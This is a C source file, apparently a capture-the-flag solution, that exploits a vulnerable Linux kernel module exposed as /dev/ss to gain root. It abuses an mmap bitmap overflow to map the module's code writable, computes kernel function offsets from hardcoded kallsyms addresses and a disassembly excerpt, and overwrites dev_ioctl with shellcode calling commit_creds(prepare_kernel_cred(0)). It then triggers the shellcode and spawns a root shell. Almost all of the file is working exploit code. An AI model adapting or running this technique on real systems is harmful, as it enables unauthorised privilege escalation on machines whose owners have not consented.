#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/ioctl.h>

/*
ffffffff828c4e50 T commit_creds
ffffffff828c51d0 T prepare_kernel_cred
ffffffff832dc5d0 T mutex_lock
*/
// get from /proc/kallsyms
unsigned long commit_creds_addr = 0xffffffff828c4e50;    // FIXME
unsigned long prepare_kernel_cred_addr = 0xffffffff828c51d0;    // FIXME
unsigned long mutex_lock_addr = 0xffffffff832dc5d0;    // FIXME

unsigned long func_dev_ioctl_off = 0x710;    // FIXME get from binary
unsigned long call_mutex_lock_off = 0x752;    // FIXME get from binary
unsigned long storage_cache_off = 0x3000;    // FIXME get from binary

//#define STORAGE_SLOT_COUNT (16)
//#define STORAGE_SLOT_SIZE (16*PAGE_SIZE)

int main(void) {
	int fd1 = open("/dev/ss", O_RDWR);
	ioctl(fd1, 0, 15);
	char *addr1 = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED, fd1, 15*4096);
	*(long *)(addr1+4096-8) = -1;    // set the bitmap underoverflow pages
	munmap(addr1, 4096);
	close(fd1);


	int fd2 = open("/dev/ss", O_RDWR);
	ioctl(fd2, 0, 0);
	char *addr2 = mmap(NULL, 0x100000000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_NORESERVE, fd2, 0);

	char *code_addr = addr2+0x100000000-0x4000;    // code_addr is the base addr of the kernel module. I don't know why this offset is not equal to storage_cache_off
	// here, bitmap has already setted, so later page fault handler will not copy data from storage to storage_cache
	//write(1, code_addr, 4096);

	/*
.text:0000000000000700 ; __int64 __fastcall dev_ioctl(file *filep, unsigned int request, unsigned __int64 data)
.text:0000000000000700 dev_ioctl       proc near               ; DATA XREF: __mcount_loc:00000000000008D6↓o
.text:0000000000000700                                         ; .data:fileops↓o
.text:0000000000000700 filep = rdi                             ; file *
.text:0000000000000700 request = rsi                           ; unsigned int
.text:0000000000000700 data = rdx                              ; unsigned __int64
.text:0000000000000700                 call    __fentry__      ; PIC mode
.text:0000000000000705                 test    esi, esi
...
.text:000000000000073A                 mov     filep, r12
.text:000000000000073D                 call    mutex_lock      ; PIC mode
.text:0000000000000742                 mov     rdi, r13
...
	 */

	// from the relative call _raw_spin_lock instruction to caculate any kernel function relative offset
	unsigned long base_relative_addr = (long)*(int *)(code_addr+call_mutex_lock_off-4)-mutex_lock_addr + (call_mutex_lock_off-func_dev_ioctl_off);
	//int relative_commit_creds_addr = base_relative_addr + commit_creds_addr;
	//int relavive_prepare_kernel_cred_addr = base_relative_addr + prepare_kernel_cred_addr;

	/*
	 * 48 31 ff : xor rdi, rdi
	 * e8 xx xx xx xx : call prepare_kernel_cred
	 * 48 89 c7 : mov rdi, rax
	 * e8 xx xx xx xx : call commit_creds
	 * c3 : ret
	 */
#define SHELLCODE_LEN 17    // FIXME
	// generate shellcode: commit_creds(prepare_kernel_cred(0))
	char buf[SHELLCODE_LEN] = {0x48, 0x31, 0xff,  0xe8, 0,0,0,0,  0x48, 0x89, 0xc7,  0xe8, 0,0,0,0,  0xc3};
	*(int *)(buf+4) = base_relative_addr+prepare_kernel_cred_addr - (8);
	*(int *)(buf+12) = base_relative_addr+commit_creds_addr - (16);

	// backup origin code
	char oldcode[SHELLCODE_LEN];
	memcpy(oldcode, code_addr+func_dev_ioctl_off, SHELLCODE_LEN);

	// install shellcode
	memcpy(code_addr+func_dev_ioctl_off, buf, SHELLCODE_LEN);

	// trigger shellcode then gain root
	ioctl(fd2, 0, 0);

	// recovery origin code (actually not necessary)
	memcpy(code_addr+func_dev_ioctl_off, oldcode, SHELLCODE_LEN);

	munmap(addr2, 0x100000000);
	close(fd2);

	execl("/bin/sh", "/bin/sh", NULL);
	
	return 0;
}

